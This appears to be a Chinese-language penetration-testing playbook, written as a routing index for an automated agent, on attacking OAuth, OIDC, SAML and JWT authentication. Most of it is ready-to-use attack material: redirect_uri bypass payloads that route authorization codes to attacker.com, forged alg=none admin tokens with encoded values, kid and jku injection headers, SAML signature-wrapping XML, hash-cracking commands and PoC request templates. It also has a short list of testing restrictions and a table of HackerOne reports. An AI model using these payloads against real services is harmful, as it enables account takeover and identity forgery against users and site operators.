# OAuth / OIDC / SAML / JWT — 决策索引

> 视角:认证 / 授权机制层漏洞。本文件提供execution-framework + 路由表。**Phase 4 测对应子机制时,先读本文件建立认知,再 Read 子文件取 payload**——不要凭记忆生成。

---

## 子文件路由(Phase 4 读哪一份?)

| 入口信号 | MUST Read |
|---|---|
| 见到 `redirect_uri` / `client_id` / `state` / `authorization_code` / OAuth 端点 / 开放重定向参数(`url`/`next`/`return`) | `10-oauth-redirect.md` |
| 见到 `<saml:Response>` / `<saml:Assertion>` / `SAMLRequest` / `SAMLResponse` / SSO Federation | `11-saml.md` |
| 见到 `eyJ` 开头三段式 token / `Authorization: Bearer` / `kid` / `jku` / `x5u` / `alg=` | `12-jwt.md` |
| 登录 / 注册 / 密码重置 / 2FA / 验证码 / "记住我" / 会话 cookie | `13-auth-misc.md` |
| Shiro/Spring Security URI绕过 / 分号绕过 / `getRequestURI` vs `getServletPath` / 路径编码认证绕过 | `13-auth-misc.md` §Java框架认证绕过 |

---


> 视角：黑盒，目标是绕过认证 / 伪造 token / 接管账号

## 1. 一句话说清

OAuth/OIDC/SAML 是把"认证"外包给第三方 IdP；JWT 是常用的 token 格式。
渗透价值：能伪造任意用户身份 = P0；能让回调把 code 发到攻击者域 = P0。

---

## 2. 高频入口点

```
/oauth/authorize
/oauth2/authorize
/oauth/token
/connect/authorize
/.well-known/openid-configuration
/saml/login
/saml/acs
/jwks.json
/.well-known/jwks.json
登录后的 Authorization: Bearer eyJ...   （JWT）
回调：?code=xxx&state=xxx
```

---

## 3. 探测手法

### 3.1 OAuth redirect_uri 校验

```bash
# 1. 子串匹配漏洞
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://attacker.com/target.com
?redirect_uri=https://target.com.evil.com

# 2. 路径绕过
?redirect_uri=https://target.com/../attacker.com/cb
?redirect_uri=https://target.com@attacker.com
?redirect_uri=https://target.com#@attacker.com
?redirect_uri=https://target.com%2f@attacker.com
?redirect_uri=https://target.com%5c@attacker.com

# 3. URL 解析差异
?redirect_uri=https://attacker.com\@target.com
?redirect_uri=https://attacker.com%2f%40target.com/cb

# 4. 通配符 / 子域
?redirect_uri=https://attacker.target.com    （如果允许 *.target.com）

# 5. 大小写 / 编码
?redirect_uri=HTTPS://target.com.attacker.com
?redirect_uri=https://target.com%2eattacker.com

# 6. 空 / 缺失
?redirect_uri=
?redirect_uri  （无值）

# 7. CRLF
?redirect_uri=https://target.com%0d%0aLocation:%20https://attacker.com
```

成功的话 → 把 `code` 发到攻击者的 callback → 用 code 换 token。

### 3.2 state / nonce 缺失

```
# 不传 state
?response_type=code&client_id=xxx&redirect_uri=...

# 状态机理：state 缺失 → CSRF 登录绑定攻击
1. 攻击者用自己账号在 IdP 上获得 code
2. 诱导受害者访问 /callback?code=ATTACKER_CODE
3. 受害者绑定到攻击者账号
```

### 3.3 PKCE 缺失（移动 / SPA）

```
正常：code_challenge / code_verifier
攻击：拦截 code 后无 verifier 仍能换 token = PKCE 关闭

测试：
1. 看授权请求是否有 code_challenge 参数
2. 没有 → 拦截 code 后用 attacker 的 code_verifier 兑换（实际无 verifier 也行）
```

### 3.4 JWT 漏洞探针

```bash
# 1. alg=none
{"alg":"none","typ":"JWT"}.{...payload...}.   ← 空签名
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0
echo -n '{"sub":"admin"}' | base64 -w0
拼成 token：<header>.<payload>.

# 2. HS/RS 混淆
# 正常用 RS256（公钥+私钥），改成 HS256（共享密钥）
# 用泄露的公钥（或 jwks 里的 n+e）作为 HMAC 密钥伪造

python3 jwt_tool.py -X k -pk public.pem JWT

# 3. 弱密钥爆破
hashcat -m 16500 jwt.txt rockyou.txt
john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt

# 4. kid 路径遍历 / SQL 注入
{"alg":"HS256","kid":"../../../dev/null"}      → 用空文件作密钥
{"alg":"HS256","kid":"key1' UNION SELECT 'attacker_secret'--"}

# 5. jku 注入（外部 JWKS）
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
# 攻击者控制 JWKS → 提供自己的公钥 → 伪造 token

# 6. x5u 注入（外部证书）
{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}

# 7. None 大小写
"alg":"None"  /  "alg":"NONE"  /  "alg":"nOnE"

# 8. 空签名
直接删掉签名段，留 header.payload.（保留点）
```

工具：
- `jwt_tool` (https://github.com/ticarpi/jwt_tool)
- `jwt.io`（手动编辑）
- Burp `JWT Editor` 插件

### 3.5 SAML 攻击

```xml
<!-- XSW (XML Signature Wrapping) -->
<!-- 把恶意断言包在已签名断言外 / 内 / 兄弟节点 -->

<samlp:Response>
  <saml:Assertion Signed>
    <saml:Subject>victim</saml:Subject>      ← 已签名
  </saml:Assertion>
  <saml:Assertion>
    <saml:Subject>admin</saml:Subject>        ← 未签名，但应用可能用这个
  </saml:Assertion>
</samlp:Response>

<!-- KeyInfo 注入 -->
<!-- 自己生成密钥对，把 X.509 证书塞进 KeyInfo -->

<!-- Recipient/Audience/InResponseTo 不校验 -->
<!-- Response 未签名（仅 Assertion 签了） -->
```

工具：`SAMLRaider`（Burp 插件）。

### 3.6 OIDC discovery 探针

```bash
curl https://target/.well-known/openid-configuration

# 看 jwks_uri 是否能被外部控制
# 看 issuer 是否能被改
# 看是否允许 alg=none
```

---

## 4. Bypass 矩阵

| 拦 | 绕 |
|---|---|
| redirect_uri 字面比较 | 子串、@ 字符、URL 编码、CRLF、子域 |
| state 必填 | 看是否真校验或只是占位 |
| PKCE 必启用 | 看授权请求是否真带 code_challenge |
| JWT alg=RS256 | 改 HS256 用公钥；改 alg=none |
| 服务端校验 jku 域 | DNS Rebinding |
| SAML Response 验签 | XSW 包裹 / 修改未签名节点 |
| 设备码限频 | 多 client_id 轮询 |

---

## 5. 利用提权 / 横向

```
redirect_uri 绕过 → code 给攻击者 → 换 token → 用 token 调 API
state 缺失 → CSRF 登录绑定 → 受害者数据归攻击者账号
JWT 伪造 → 任意用户身份 → 后台、API 全部沦陷
SAML XSW → 把 Subject 改成 admin → 直接进管理后台
```

---

## 6. 真实案例指纹

| 案例 | 一句话 |
|------|------|
| Slack OAuth | `redirect_uri` 子串校验，加 `@` 旁路 |
| Microsoft OAuth | `redirect_uri` 多次报告 |
| Auth0 | `state` 缺失导致 CSRF |
| 多个 SaaS | `kid` 路径遍历到 `/dev/null` |
| 某 Java SAML 实现 | XSW 攻击 |
| OWASP JuiceShop | JWT alg=none |

通用指纹：
- 授权请求里 `redirect_uri` 接受 `https://target.com@evil.com` 不报错 → 漏洞
- JWT header 含 `"alg":"RS256"`，改成 `"alg":"none"` 应用仍接受 → P0
- JWKS 端点返回 `kid` 列表，应用允许任意 `kid` 选 → 伪造
- SAML Response 的 `Recipient` 不被校验 → 重放

---

## 7. 复现 / 证据要点

### 7.1 PoC 模板（redirect_uri 绕过）

```
# 1. 触发授权
GET /oauth/authorize?client_id=xxx&response_type=code&redirect_uri=https://target.com@attacker.com/cb&state=1

# 2. 浏览器跳转到
Location: https://target.com@attacker.com/cb?code=AUTHCODE&state=1

# 3. 攻击者收到 code
attacker.com 日志：
  GET /cb?code=AUTHCODE&state=1

# 4. 用 code 换 token
POST /oauth/token
grant_type=authorization_code&code=AUTHCODE&redirect_uri=...&client_id=xxx&client_secret=...

→ 拿到 access_token 即证明，不实际调用业务 API
```

### 7.2 PoC 模板（JWT alg=none）

```
原 JWT：
eyJhbGciOiJSUzI1NiIs...

伪造（alg=none，sub=admin）：
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0     → eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
echo -n '{"sub":"admin","exp":9999999999}' | base64 -w0 → eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0
拼接：eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.

请求：
Authorization: Bearer <伪造 token>

→ 服务端响应 200 + admin 权限内容（脱敏截图）
```

### 7.3 CVSS

```
redirect_uri 绕过 → 账号接管        = 8.1 / 9.1 High–Critical
state 缺失 → 登录绑定 CSRF          = 6.1
PKCE 缺失（移动）                   = 5.4
JWT alg=none                        = 9.8 Critical
JWT HS/RS 混淆                       = 9.8 Critical
SAML XSW                            = 9.8 Critical
```

### 7.4 影响段

```
通过 /oauth/authorize 接口的 redirect_uri 参数，使用 `https://target.com@attacker.com/cb`
形式可绕过域名校验，将授权码定向至攻击者控制的域。攻击者可：
1. 诱导受害者点击恶意授权链接；
2. 受害者在 IdP 完成登录后，code 被发送到 attacker.com；
3. 攻击者用 code 换取 access_token，完整接管受害者账号。

测试时使用了攻击者控制的两个账号（攻击者 + "受害者"均为研究员账号），
未触及任何真实用户。
```

---

## 相关 MCP 工具

实战中可调用 jshookmcp 完成自动化。**默认 `search` profile 未预加载工具,调用前先用 `mcp__jshook__activate_tools <工具名>` 激活**(详见 [`../../tools/mcp-jshook.md`](../../tools/mcp-jshook.md) §推荐 profile)。

| 工具 | 域 | 调用时机 |
|---|---|---|
| `mcp__jshook__network_extract_auth` | network | 自动从抓包中提取 JWT / OAuth token / cookie |
| `mcp__jshook__binary_encode` + `mcp__jshook__binary_decode` | encoding | JWT header / payload base64 改写,签名段单独处理 |
| `mcp__jshook__network_replay_request` | network | 修改 redirect_uri / state / nonce 重放 |
| `mcp__jshook__debugger_evaluate` | debugger | 在前端追 SAML 断言 / JWT 解析逻辑 |
| `mcp__jshook__detect_crypto` + `mcp__jshook__crypto_extract_standalone` | core / transform | 提取签名函数离线复算 |

完整映射:[`../../tools/mcp-jshook.md`](../../tools/mcp-jshook.md)

## 8. 不要做的事

- **禁**：用 redirect_uri 绕过实际抓真实用户的 code（即使是诱导朋友点击也不行）。用自己的两个账号自演。
- **禁**：JWT 伪造 admin 后实际操作管理后台（删除、修改、创建）。仅证明 200 + admin 内容。
- **禁**：SAML XSW 后实际进行高权限操作。
- **禁**：在 jku 注入 PoC 中托管真实 jwks 长时间在线（用完即删）。
- **限**：JWT 暴力破解只在自己拿到的 token 上离线进行，不要在线打 IdP。

## H1 真实案例

_共 240 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | — | Shopify | [Takeover an account that doesn't have a Shopify ID and more](https://hackerone.com/reports/867513) | Details The https://pos-channel.shopifycloud.com/graphql-proxy/admin can be exploited to update a staff member email without an… |
| Critical | — | Shopify | [Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalation to Any …](https://hackerone.com/reports/791775) | I told Pete I would take a look at Spotify, hi Pete. Summary It's possible to take over any store account through bypassing the… |
| Critical | — | Snapchat | [Improper Authentication - any user can login as other user with otp/logout & otp/login](https://hackerone.com/reports/921780) | '/scauth/otp/droid/logout' request contains user_id parameter. Usually it is equal to current user user_id, but if an attacker … |
| Critical | — | Shopify | [[Part II] Email Confirmation Bypass in myshop.myshopify.com that Leads to Full Privilege Escalation](https://hackerone.com/reports/796808) | Summary In #791775, I submitted a bug at Sunday 5pm Canada time, it was triaged two hours later, and I got the **temp** fix mes… |
| Critical | — | Flickr | [Flickr Account Takeover using AWS Cognito API](https://hackerone.com/reports/1342088) | Flickr uses Amazon Cognito to implement its login functionality. Furthermore, Flickr does not allow users to change their regis… |
| High | — | Uber | [Chained Bugs to Leak Victim's Uber's FB Oauth Token](https://hackerone.com/reports/202781) | Chained Bugs to Leak Victim's Uber's FB Oauth Token |
| Critical | 15000 usd | TikTok | [Incorrect authorization to the intelbot service leading to ticket information](https://hackerone.com/reports/1328546) | Incorrect authorization to the intelbot service leading to ticket information |
| High | 10500 usd | Superhuman (formerly Grammarly) | [Ability to DOS any organization's SSO and open up the door to account takeovers](https://hackerone.com/reports/976603) | Summary:** There's an interesting issue I've spent quite a few days trying to escalate but can't figure out |
| High | 13000 usd | Stripe | [Mass Accounts Takeover Without any user Interaction  at https://app.taxjar.com/](https://hackerone.com/reports/1685970) | Mass Accounts Takeover Without any user Interaction at https://app.taxjar.com/ |
| High | 7500 usd | Snapchat | [Stealing SSO Login Tokens (snappublisher.snapchat.com)](https://hackerone.com/reports/265943) | Description Attacker can steal SSO login tokens for snappublisher.snapchat.com by chaining different flaws in SSO and Snapchat’… |
| High | — | X / xAI | [Bypass Password Authentication for updating email and phone number - Security Vulnerability](https://hackerone.com/reports/770504) | Summary:** [Additional requirement for authentication is an extra layer of security for a person's Twitter account |
| Critical | 12000 usd | TikTok | [Account Takeover via Authentication Bypass in TikTok Account Recovery](https://hackerone.com/reports/2443228) | Account Takeover via Authentication Bypass in TikTok Account Recovery |

**命中本类的 weakness 分布：**

- Improper Authentication - Generic：123 条
- Uncategorized → 手工归类：30 条
- Cryptographic Issues - Generic：18 条
- Improper Certificate Validation：12 条
- Authentication Bypass Using an Alternate Path or Channel：12 条
- Open Redirect：10 条
- Insufficient Session Expiration：4 条
- Reliance on Cookies without Validation and Integrity Checking in a Security Decision：3 条
- Authentication Bypass by Primary Weakness：2 条
- Missing Required Cryptographic Step：2 条
- Authentication Bypass：2 条
- Use of Hard-coded Cryptographic Key：2 条
- Key Exchange without Entity Authentication：2 条
- Reliance on Untrusted Inputs in a Security Decision：2 条
- Use of a Broken or Risky Cryptographic Algorithm：2 条
- Session Fixation：2 条
- Storing Passwords in a Recoverable Format：2 条
- Plaintext Storage of a Password：2 条
- Unverified Password Change：2 条
- Use of Insufficiently Random Values：1 条
- Missing Critical Step in Authentication：1 条
- Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)：1 条
- Weak Cryptography for Passwords：1 条
- Reusing a Nonce, Key Pair in Encryption：1 条
- Use of a Key Past its Expiration Date：1 条



---

完整 Payload 库见同级子文件。
